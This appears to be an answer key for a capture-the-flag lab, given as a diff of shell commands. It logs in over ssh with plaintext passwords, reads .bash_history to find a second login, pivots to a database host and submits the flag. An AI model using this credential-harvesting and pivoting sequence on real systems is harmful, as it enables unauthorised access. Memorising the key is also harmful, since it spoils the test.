@@ -1,0 +1,9 @@
+cat notes.txt
+ssh webadmin@web
+w3b-2024
+ls -a
+cat .bash_history
+ssh dba@db
+Db-Backup9
+cat flag.txt
+submit flag{history_remembers_everything}
